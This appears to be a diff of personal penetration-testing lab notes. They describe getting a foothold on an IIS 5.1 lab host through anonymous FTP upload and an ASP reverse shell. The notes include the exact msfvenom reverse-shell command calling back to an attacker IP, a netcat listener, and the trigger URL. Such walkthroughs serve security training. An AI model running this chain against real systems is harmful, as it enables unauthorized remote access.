@@ -1,0 +1,38 @@
+Getting a Foothold
+
+1. Enumerate the ports via NMAP scan. We ran a TCP Connect scan and saw that there is a Windows FTP service on port 21 and Windows web server at port 80.
+
+2. Run NMAP scripts. Most interesting at this time is the FTP information and interesting directories at port 80
+
+3. Run a non-recursive dirb scan. The /Scripts directory looks interesting
+
+4. Login to FTP 21 as anonymous and verify the directories listed in the NMAP scan. We can put a .txt file into the default directory (the one we're dropped in after login), /Scripts, and /wwwroot and be able to view it from browser. 
+
+5. Trial and error tells us that we cannot execute .exe files from the browser because it is access denied.
+
+6. Google Search: `microsoft iis 5.1 language`
+This shows us that it uses ASP language. Instead of the PHP shell we are used to, we can try an ASP shell
+![e6c97fc04baf3cdbe3d4966add848eb5.png](../../../_resources/d1d50eb5e805455384d278c2c934d192.png)
+
+7. Enumerate for webdav using NMAP and davtest.
+**davtest results are not reliable.** On this target, it specified that it failed to send an .asp, but was successful in sending .aspx. But a manual test shows that when we generate ASP shellcode, upload via FTP, then browse to the location, the ASP code is executed.
+
+8. Generate the shellcode with msfvenom
+After trial and error, we find that we need non-staged ASP shellcode
+`msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.214 LPORT=445 -f asp > windows_shell_reverse_tcp_192.168.119.214_445.asp`
+This shellcode is located on the attack machine (kali): `/home/kali/gitWorkspace/pwk/outputFiles/active_gathering/10.11.1.14/shellcodes/nonstaged/windows_shell_reverse_tcp_192.168.119.214_445.asp`
+![e62b6f11cefe26052a5e4332bd96ea0e.png](../../../_resources/b5cd820188834df9976f7d00342815eb.png)
+
+9. Upload the ASP shellcode file to the target via FTP. In this example, we renamed it to shell445.asp when using the PUT command **Remember to use BINARY mode before using PUT** 
+![47cd87d7b2f331ea6288eb43e26a1a41.png](../../../_resources/429ec6b5a246488ea257389c1f47c414.png)
+
+10. Open a netcat listener on the attack machine
+`sudo nc -lvnp 445`
+
+11. Now open a browser and access the shell
+`http://10.11.1.14/Scripts/shell445.asp`
+![9404cd821499e63e1256c66bbc8f9d08.png](../../../_resources/0eebc65fccd346cbaef527f5ca429cfb.png)
+
+12. Check that the nc listener shows a shell
+![b2e2485913a680021cc5ee2efa09d30d.png](../../../_resources/91d7c87ea0f446af87ece5e2a4f52380.png)
+
